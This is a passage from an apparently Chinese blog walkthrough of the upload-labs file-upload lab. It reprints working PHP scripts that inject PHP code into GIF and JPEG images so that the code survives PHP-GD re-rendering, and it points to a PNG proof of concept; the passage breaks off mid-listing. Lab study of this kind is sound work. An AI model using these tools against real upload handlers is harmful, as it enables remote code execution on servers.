class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">'Something\\'s wrong'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkImage</span><span class=\"params\">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> $correctImage;</span><br><span class=\"line\">\t\tfile_put_contents($filename, $data);</span><br><span class=\"line\">\t\t$correctImage = <span class=\"keyword\">TRUE</span>;</span><br><span class=\"line\">\t\timagecreatefromjpeg($filename);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($unlink)</span><br><span class=\"line\">\t\t\tunlink($filename);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $correctImage;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">custom_error_handler</span><span class=\"params\">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> $extraBytes, $correctImage;</span><br><span class=\"line\">\t\t$correctImage = <span class=\"keyword\">FALSE</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/(\\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($m[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\">\t\t\t\t$extraBytes = (int)$m[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DataInputStream</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">private</span> $binData;</span><br><span class=\"line\">\t\t<span class=\"keyword\">private</span> $order;</span><br><span class=\"line\">\t\t<span class=\"keyword\">private</span> $size;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;order = $order;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(!$fromString) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'File not exists ['</span>.$filename.<span class=\"string\">']'</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = $filename;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;size = strlen(<span class=\"keyword\">$this</span>-&gt;binData);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">seek</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> (<span class=\"keyword\">$this</span>-&gt;size - strlen(<span class=\"keyword\">$this</span>-&gt;binData));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">skip</span><span class=\"params\">($skip)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, $skip);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readByte</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;eof()) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'End Of File'</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$byte = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> ord($byte);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readShort</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(strlen(<span class=\"keyword\">$this</span>-&gt;binData) &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'End Of File'</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$short = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;binData = substr(<span class=\"keyword\">$this</span>-&gt;binData, <span class=\"number\">2</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"keyword\">$this</span>-&gt;order) &#123;</span><br><span class=\"line\">\t\t\t\t$short = (ord($short[<span class=\"number\">1</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord($short[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t\t$short = (ord($short[<span class=\"number\">0</span>]) &lt;&lt; <span class=\"number\">8</span>) + ord($short[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> $short;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eof</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> !<span class=\"keyword\">$this</span>-&gt;binData||(strlen(<span class=\"keyword\">$this</span>-&gt;binData) === <span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/fileupload/upload-labs/016_3.png\" alt=\"016_3\"></p>\n<h3 id=\"gif\"><a href=\"#gif\" class=\"headerlink\" title=\"gif:\"></a>gif:</h3><p>可以通过对比gif图删剪部分,可以尝试把payload插入到未修改部分。这里也有脚本帮助啊。</p>\n<p><code>https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE</code></p>\n<h4 id=\"脚本-1\"><a href=\"#脚本-1\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"php\"><span class=\"meta\">&lt;?php</span></span></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Author: rickchen.vip(at)gmail.com</span><br><span class=\"line\"> * Date: 2015-04-05</span><br><span class=\"line\"> * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE</span><br><span class=\"line\"> * Reference: http://www.secgeek.net/bookfresh-vulnerability/</span><br><span class=\"line\"> * Usage: php codeinj.php demo.gif \"&lt;?php phpinfo();?&gt;\"</span><br><span class=\"line\"><span class=\"php\"> */</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">gd_process</span><span class=\"params\">($src_img, $dst_img)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">try</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"comment\"># you can redefine the GD process</span></span></span><br><span class=\"line\"><span class=\"php\">        $im = imagecreatefromgif($src_img);</span></span><br><span class=\"line\"><span class=\"php\">        imagegif($im, $dst_img);</span></span><br><span class=\"line\"><span class=\"php\">    &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">Exception</span> $e) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        printf(<span class=\"string\">\"%s\\n\"</span>, $e-&gt;getMessage());</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">find_similar_block</span><span class=\"params\">($src_img, $dst_img, $block_len, $slow=false)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $src_data = fread(fopen($src_img, <span class=\"string\">\"rb\"</span>), filesize($src_img));</span></span><br><span class=\"line\"><span class=\"php\">    $dst_data = fread(fopen($dst_img, <span class=\"string\">\"rb\"</span>), filesize($dst_img));</span></span><br><span class=\"line\"><span class=\"php\">    $src_index = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"php\">    $pre_match_array = <span class=\"keyword\">array</span>();</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">while</span> ($src_index &lt; (strlen($src_data) - $block_len)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        $find_data = substr($src_data, $src_index, $block_len);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">        $dst_index = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"php\">        $found = <span class=\"keyword\">false</span>;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">while</span> ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">            $temp_data = substr($dst_data, $dst_index, $block_len);</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">if</span> (<span class=\"number\">0</span> === strcmp($find_data, $temp_data)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">                $match = <span class=\"keyword\">array</span>(</span></span><br><span class=\"line\"><span class=\"php\">                    <span class=\"string\">\"src_offset\"</span> =&gt; $src_index,</span></span><br><span class=\"line\"><span class=\"php\">                    <span class=\"string\">\"dst_offset\"</span> =&gt; $dst_index</span></span><br><span class=\"line\"><span class=\"php\">                );</span></span><br><span class=\"line\"><span class=\"php\">                $pre_match_array[] = $match;</span></span><br><span class=\"line\"><span class=\"php\">                $found = <span class=\"keyword\">true</span>;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\">                /*</span><br><span class=\"line\">                printf(\"Similar block found&gt; src_offset: %d\\n\", $src_index);</span><br><span class=\"line\">                printf(\"                     dst_offset: %d\\n\", $dst_index);</span><br><span class=\"line\">                printf(\"                   similar_data: %s\\n\", str2hex($temp_data));</span><br><span class=\"line\">                printf(\"                 similar_length: %s\\n\\n\", strlen($temp_data));</span><br><span class=\"line\"><span class=\"php\">                */</span></span><br><span class=\"line\"><span class=\"php\">            &#125;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">if</span> ($found &amp;&amp; $slow == <span class=\"keyword\">false</span>)</span></span><br><span class=\"line\"><span class=\"php\">                $dst_index += $block_len;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"php\">                $dst_index++;</span></span><br><span class=\"line\"><span class=\"php\">        &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">if</span> ($found &amp;&amp; $slow == <span class=\"keyword\">false</span>)</span></span><br><span class=\"line\"><span class=\"php\">            $src_index += $block_len;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"php\">            $src_index++;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $pre_match_array;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inject_code_to_src_img</span><span class=\"params\">($src_img, $pre_match_array, $injection_code)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $src_data = fread(fopen($src_img, <span class=\"string\">\"rb\"</span>), filesize($src_img));</span></span><br><span class=\"line\"><span class=\"php\">    $inj_len = strlen($injection_code);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    $find_n = <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">foreach</span> ($pre_match_array <span class=\"keyword\">as</span> $similar_block) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"comment\">#printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len);</span></span></span><br><span class=\"line\"><span class=\"php\">        $mod_src_data = substr($src_data, <span class=\"number\">0</span>, $similar_block[<span class=\"string\">\"src_offset\"</span>]).$injection_code.substr($src_data, $similar_block[<span class=\"string\">\"src_offset\"</span>] + $inj_len);</span></span><br><span class=\"line\"><span class=\"php\">        $temp_img = sys_get_temp_dir().<span class=\"string\">\"/\"</span>.$src_img.<span class=\"string\">\".mod\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">        $temp_cvt_img = $temp_img.<span class=\"string\">\".gd\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">        fwrite(fopen($temp_img, <span class=\"string\">\"wb\"</span>), $mod_src_data);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">if</span> (!gd_process($temp_img, $temp_cvt_img)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"comment\">#printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]);</span></span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"comment\">#printf(\"                                           length: %d\\n\\n\", $inj_len);</span></span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">continue</span>;</span></span><br><span class=\"line\"><span class=\"php\">        &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">            <span class=\"keyword\">if</span> (check_code($temp_cvt_img, $injection_code)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">                $fuck_img = <span class=\"string\">\"gd_\"</span>.$src_img;</span></span><br><span class=\"line\"><span class=\"php\">                fwrite(fopen($fuck_img, <span class=\"string\">\"wb\"</span>), $mod_src_data);</span></span><br><span class=\"line\"><span class=\"php\">                printf(<span class=\"string\">\"Inject code to source image successful with offset: %d\\n\"</span>, $similar_block[<span class=\"string\">\"src_offset\"</span>]);</span></span><br><span class=\"line\"><span class=\"php\">                printf(<span class=\"string\">\"Saving result \\\"%s\\\", have fun! :)\\n\"</span>, $fuck_img);</span></span><br><span class=\"line\"><span class=\"php\">                <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">            &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">                <span class=\"keyword\">continue</span>;</span></span><br><span class=\"line\"><span class=\"php\">                <span class=\"comment\">#printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]);</span></span></span><br><span class=\"line\"><span class=\"php\">            &#125;</span></span><br><span class=\"line\"><span class=\"php\">        &#125;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_code</span><span class=\"params\">($src_img, $injection_code)</span> </span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $data = fread(fopen($src_img, <span class=\"string\">\"rb\"</span>), filesize($src_img));</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> strpos($data, $injection_code);</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">str2hex</span><span class=\"params\">($str)</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $hex = <span class=\"string\">\"\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($str); $i++)&#123;</span></span><br><span class=\"line\"><span class=\"php\">        $hex .= sprintf(<span class=\"string\">\"%02x\"</span>, (ord($str[$i])));;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $hex;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hex2str</span><span class=\"params\">($hex)</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"php\">    $str = <span class=\"string\">\"\"</span>;</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; strlen($hex)<span class=\"number\">-1</span>; $i+=<span class=\"number\">2</span>)&#123;</span></span><br><span class=\"line\"><span class=\"php\">        $str .= chr(hexdec($hex[$i].$hex[$i+<span class=\"number\">1</span>]));</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">return</span> $str;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">/* main */</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span> ($argc &lt; <span class=\"number\">3</span>) &#123;</span></span><br><span class=\"line\"><span class=\"php\">    printf(<span class=\"string\">\"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\\n\"</span>, $argv[<span class=\"number\">0</span>]);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">$slow = <span class=\"keyword\">false</span>;</span></span><br><span class=\"line\"><span class=\"php\">$src_img = $argv[<span class=\"number\">1</span>];</span></span><br><span class=\"line\"><span class=\"php\">$injection_code = $argv[<span class=\"number\">2</span>];</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">$img_info = getimagesize($src_img);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"comment\">/* GIF image type value \"1\" */</span></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span> ($img_info[<span class=\"number\">2</span>] == <span class=\"string\">'1'</span>) &#123;</span></span><br><span class=\"line\"><span class=\"php\">    $cvt_img = sys_get_temp_dir().<span class=\"string\">\"/\"</span>.basename($src_img);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">if</span> (!gd_process($src_img, $cvt_img)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">        printf(<span class=\"string\">\"PHP-GD process() function error, please check out.\\n\"</span>);</span></span><br><span class=\"line\"><span class=\"php\">        <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">    &#125;</span></span><br><span class=\"line\"><span class=\"php\">&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">    printf(<span class=\"string\">\"This script only support GIF image.\\n\"</span>);</span></span><br><span class=\"line\"><span class=\"php\">    <span class=\"keyword\">exit</span>;</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">$block_len = strlen($injection_code);</span></span><br><span class=\"line\"><span class=\"php\">$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\"><span class=\"keyword\">if</span> (sizeof($pre_match_array)) &#123;</span></span><br><span class=\"line\"><span class=\"php\">    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);</span></span><br><span class=\"line\"><span class=\"php\">&#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"php\">    printf(<span class=\"string\">\"Not found any similar %d bytes block.\\n\"</span>, strlen($injection_code));</span></span><br><span class=\"line\"><span class=\"php\">&#125;</span></span><br><span class=\"line\"><span class=\"php\"></span></span><br><span class=\"line\"><span class=\"php\">printf(<span class=\"string\">\"Cant find any useful similar block to inject code, but take it easy. :(\\n\"</span>);</span></span><br></pre></td></tr></table></figure>\n\n<p>用其自带的<code>demo.gif</code>,我这里一次就成功了,不行的话多尝试下换一张图片或者尝试其他payload。</p>\n<p><img src=\"/img/fileupload/upload-labs/016_4.png\" alt=\"016_4\"></p>\n<p><img src=\"/img/fileupload/upload-labs/016_5.png\" alt=\"016_5\"></p>\n<h3 id=\"png\"><a href=\"#png\" class=\"headerlink\" title=\"png:\"></a>png:</h3><p><code>https://raw.githubusercontent.com/hxer/imagecreatefrom-/master/png/poc/poc_png.py</code></p>\n<h4 id=\"脚本-2\"><a href=\"#脚本-2\" class=\"headerlink\" title=\"脚本\"></a>脚本</h4><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span 